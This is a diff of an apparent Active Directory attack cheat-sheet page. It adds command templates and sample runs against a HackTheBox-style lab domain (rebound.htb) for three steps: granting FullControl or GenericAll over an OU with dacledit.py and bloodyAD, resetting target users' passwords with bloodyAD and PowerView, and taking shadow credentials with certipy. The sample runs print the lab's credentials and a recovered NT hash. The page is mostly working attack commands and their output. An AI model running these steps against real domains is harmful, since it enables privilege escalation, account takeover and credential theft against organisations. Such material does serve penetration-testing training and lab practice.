@@ -336,37 +336,98 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <button data-tabset="set1" data-tabcontent="tab2" >Windows</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="0-install-latest-impacket-included-dacleditpy">0. Install latest impacket (included dacledit.py)</h4>
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-add-full-control-to-current-user">1. Add Full Control to current user</h4>
+<p><button data-tabset="set1-1" data-tabcontent="tab1" class="active">impacket</button>
+<button data-tabset="set1-1" data-tabcontent="tab2" >bloodyAD</button></p>
+<div class="tabcontent" data-tabset="set1-1" data-tabcontent="tab1"><h4 id="install-latest-impacket-included-dacleditpy">Install latest impacket (included dacledit.py)</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">git clone https://github.com/fortra/impacket.git
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cd impacket
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pip3 install .
-</span></span></span></code></pre></div><h4 id="1-add-full-control-to-current-user">1. Add Full Control to current user</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">dacledit.py -k &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-ip &lt;DC&gt; -principal &lt;USER&gt; -target-dn &#39;OU=&lt;TARGET_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; -inheritance -action write -rights FullControl
-</span></span></span></code></pre></div><h4 id="2-change-password">2. Change password</h4>
-<p><button data-tabset="set1-1" data-tabcontent="tab1" class="active">bloodyAD</button></p>
-<div class="tabcontent" data-tabset="set1-1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --host &lt;DC&gt; set password &lt;TARGET_USER&gt; &lt;NEW_PASSWORD&gt;
+</span></span></span></code></pre></div><h4 id="add-full-control-to-current-user">Add Full Control to current user</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; dacledit.py -k &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-ip &lt;DC&gt; -principal &lt;USER&gt; -target-dn &#39;OU=&lt;TARGET_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; -inheritance -action write -rights FullControl -use-ldaps
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> dacledit.py -k <span class="s1">&#39;rebound.htb/oorend:1GR8t@$$4u&#39;</span> -dc-ip 10.10.11.231 -principal oorend -target-dn <span class="s1">&#39;OU=SERVICE USERS,DC=REBOUND,DC=HTB&#39;</span> -inheritance -action write -rights FullControl -use-ldaps
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] DACL backed up to dacledit-20240923-015912.bak
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] DACL modified successfully!
+</span></span></span></code></pre></div></div>
+<div class="tabcontent" data-tabset="set1-1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; add genericAll &#39;OU=&lt;TARGET_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; &#39;&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d rebound.htb -u <span class="s1">&#39;oorend&#39;</span> -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> --host 10.10.11.231 add genericAll <span class="s1">&#39;OU=SERVICE USERS,DC=REBOUND,DC=HTB&#39;</span> <span class="s1">&#39;oorend&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
+</span></span></span></code></pre></div></div>
+<h4 id="2-change-password">2. Change password</h4>
+<p><button data-tabset="set1-2" data-tabcontent="tab1" class="active">bloodyAD</button></p>
+<div class="tabcontent" data-tabset="set1-2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; set password &#39;&lt;TARGET_USER&gt;&#39; &#39;&lt;NEW_PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d rebound.htb -u <span class="s1">&#39;oorend&#39;</span> -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> --host 10.10.11.231 <span class="nb">set</span> password <span class="s1">&#39;winrm_svc&#39;</span> <span class="s1">&#39;Test1234&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">[+] Password changed successfully!
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></em></small></p></div>
 </div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; . .\PowerView.ps1
 </span></span></span></code></pre></div><h4 id="2-change-target-user-password">2. Change target user password</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString &lt;PASSWORD&gt; -AsPlainText -Force 
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-DomainUserPassword -Identity &lt;TARGET_USER&gt; -AccountPassword $password
+</span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; $password = ConvertTo-SecureString Test1234 -AsPlainText -Force
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-DomainUserPassword -Identity &lt;TARGET_USER&gt; -AccountPassword $password
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; Set-DomainUserPassword -Identity superfume -AccountPassword $password
 </span></span></span></code></pre></div></div></p>
 <hr>
 <h3 id="abuse-2-get-shadow-credentials">Abuse #2: Get shadow credentials</h3>
 <p>
 <button data-tabset="set3" data-tabcontent="tab1" class="active">Linux</button>
 
-<div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><h4 id="0-install-latest-impacket-included-dacleditpy">0. Install latest impacket (included dacledit.py)</h4>
+<div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><h4 id="1-add-full-control-to-current-user">1. Add Full Control to current user</h4>
+<p><button data-tabset="set3-1" data-tabcontent="tab1" class="active">impacket</button>
+<button data-tabset="set3-1" data-tabcontent="tab2" >bloodyAD</button></p>
+<div class="tabcontent" data-tabset="set3-1" data-tabcontent="tab1"><h4 id="install-latest-impacket-included-dacleditpy">Install latest impacket (included dacledit.py)</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">git clone https://github.com/fortra/impacket.git
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cd impacket
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pip3 install .
-</span></span></span></code></pre></div><h4 id="1-add-full-control-to-current-user">1. Add Full Control to current user</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">dacledit.py -k &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-ip &lt;DC&gt; -principal &lt;USER&gt; -target-dn &#39;OU=&lt;TARGET_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; -inheritance -action write -rights FullControl
-</span></span></span></code></pre></div><h4 id="2-get-shadow-credentials">2. Get shadow credentials</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; certipy-ad shadow auto -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &#39;&lt;PASSWORD&gt;&#39; -k -account &lt;TARGET_USER&gt; -target &lt;DC&gt;
+</span></span></span></code></pre></div><h4 id="add-full-control-to-current-user">Add Full Control to current user</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; dacledit.py -k &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-ip &lt;DC&gt; -principal &lt;USER&gt; -target-dn &#39;OU=&lt;TARGET_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; -inheritance -action write -rights FullControl -use-ldaps
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> dacledit.py -k <span class="s1">&#39;rebound.htb/oorend:1GR8t@$$4u&#39;</span> -dc-ip 10.10.11.231 -principal oorend -target-dn <span class="s1">&#39;OU=SERVICE USERS,DC=REBOUND,DC=HTB&#39;</span> -inheritance -action write -rights FullControl -use-ldaps
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] DACL backed up to dacledit-20240923-015912.bak
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] DACL modified successfully!
+</span></span></span></code></pre></div></div>
+<div class="tabcontent" data-tabset="set3-1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; add genericAll &#39;OU=&lt;TARGET_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; &#39;&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d rebound.htb -u <span class="s1">&#39;oorend&#39;</span> -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> --host 10.10.11.231 add genericAll <span class="s1">&#39;OU=SERVICE USERS,DC=REBOUND,DC=HTB&#39;</span> <span class="s1">&#39;oorend&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
+</span></span></span></code></pre></div></div>
+<h4 id="2-get-shadow-credentials">2. Get shadow credentials</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; certipy-ad shadow auto -username &lt;USER&gt;@&lt;DOMAIN&gt; -password &#39;&lt;PASSWORD&gt;&#39; -k -account &lt;TARGET_USER&gt; -target &lt;DC&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc01.rebound.htb <span class="o">&amp;&amp;</span> certipy-ad shadow auto -username oorend@rebound.htb -password <span class="s1">&#39;1GR8t@$$4u&#39;</span> -k -account winrm_svc -target dc01.rebound.htb
+</span></span><span class="line"><span class="cl"><span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Targeting user &#39;winrm_svc&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Generating certificate
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate generated
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Generating Key Credential
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Key Credential generated with DeviceID &#39;22fdb427-7028-72b8-bc39-8f4674c644dd&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Adding Key Credential with device ID &#39;22fdb427-7028-72b8-bc39-8f4674c644dd&#39; to the Key Credentials for &#39;winrm_svc&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully added Key Credential with device ID &#39;22fdb427-7028-72b8-bc39-8f4674c644dd&#39; to the Key Credentials for &#39;winrm_svc&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Authenticating as &#39;winrm_svc&#39; with the certificate
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using principal: winrm_svc@rebound.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to get TGT...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got TGT
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saved credential cache to &#39;winrm_svc.ccache&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to retrieve NT hash for &#39;winrm_svc&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Restoring the old Key Credentials for &#39;winrm_svc&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully restored the old Key Credentials for &#39;winrm_svc&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] NT hash for &#39;winrm_svc&#39;: 4469650fd892e98933b4536d2e86e512
+</span></span></span></code></pre></div><h4 id="fix-kdc_err_padata_type_nosuppkdc-has-no-support-for-padata-type">FIX: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> No really a fix, need to runas administrator
+</span></span><span class="line"><span class="cl"><span class="go">gpupdate /force
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; gpupdate /force
+</span></span></span><span class="line"><span class="cl"><span class="go">Updating policy...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Computer Policy update has completed successfully.
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">User Policy update has completed successfully.
 </span></span></span></code></pre></div></div></p>
 <hr>
 <h3 id="abuse-3--add-user-to-group">Abuse #3 : Add user to group</h3>
